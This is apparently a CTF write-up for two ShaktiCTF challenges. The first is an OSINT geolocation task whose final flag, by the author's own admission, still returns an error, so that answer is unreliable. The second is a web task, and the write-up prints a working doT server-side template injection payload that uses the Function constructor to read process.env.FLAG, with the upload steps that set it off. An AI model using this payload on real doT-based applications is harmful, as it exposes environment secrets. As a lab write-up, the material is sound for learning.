Shaktictf 

# ShaktiCTF Writeup

![snow_white](https://github.com/user-attachments/assets/3c534425-24d0-48c5-957c-6dcd85423c76)

## Challenge 1 (OSINT): SNOW White

### Initial Analysis
The challenge was an OSINT challenge where we had to find a certain place that looked like an old pic with mountain scenery and a house nearby that looked like some Indian place. By using Google Lens, I found that the place was also known as Snow Range or **Dhauladhar Range** in the Lesser Himalayas, mainly in Himachal Pradesh (Kangra and Chamba area).

### Initial Challenges
Since I didn't know much about the place and the image was only giving little info as it was located somewhere hilly, there were very few street views observed in the hilly region as there are not many roads present there. Also, the few street views on Google Maps were not similar to the place I was searching for, so I decided to wait a little for more info.

### The Game-Changer Hint
Then a hint happened! Actually, the creator of the CTF changed some format for the challenge. Now the format is:
```
shaktiCTF{municipalcorporation_state}
```

This actually made the CTF way too easy and solvable as I know there are very few municipal corporations in a state, and I just had to cover the municipal corporations near the Dhauladhar range.

### Systematic Search Process

#### Himachal Pradesh Search
Since the major portion of the mountain is present in Himachal Pradesh, I started my search from there. As there are only 5 municipal corporations present there, I brute-forced all 5 for the answer but unfortunately none of them were the answer.

#### Expanding the Search
So I shifted my search a little to cover nearby states and the closest municipal corporations. By shortlisting, I found a few states:

- **Uttarakhand** - especially Nainital, Mussoorie, Chamoli
- **Sikkim**
- **Arunachal Pradesh** 
- **Punjab**
- **Jammu and Kashmir** - especially Jammu, Sonmarg, Gulmarg, Dahalgam

### Final Answer
After trying for the municipal corporations for all these places, I found one place that was continuously showing unique errors:

**Answer:** `shaktiCTF{jammu_jammuandkashmir}`

*Note: This is still showing error which I will be seeing later.*


<img width="296" height="257" alt="image" src="https://github.com/user-attachments/assets/24fbad0b-bf8a-494a-8b5d-e7fd00f3dcca" />
---

## Challenge 2 (Web): Templateception

### Challenge Description
The challenge was a web challenge where a website was given along with a zip file containing all the code and a few hints like:
> "when templates process templates.. things can get weird :("
> 
> "Flag is in FLAG"

### Initial Discovery
There was a flag saved in both the `.env` file and a `FLAG` file which I think was a dummy flag:
```
shaktictf{dummy}
```
This was a false flag.

### Solution Process
Later, by scrolling here and there and taking help from ChatGPT and Perplexity, I found that on the webpage we have to specify the file and upload some code with some JSON code which will return us the flag stored in the web application, just like the dummy flag which I found.

### Exploit Steps

**1. Filename:**
```
exploit.dot
```

**2. Template:**
```dot
{{= this.constructor.constructor('return process.env.FLAG')() }}
```
This uses doT's unsafe Function constructor to access environment variables (SSTI).

**3. Config (JSON):**
```json
{}
```

**4. Upload Process:**
✅ Click Upload

Once uploaded, it will give you a link to `/render/exploit.dot` — click that.

This was the way I proceeded and got the flag.




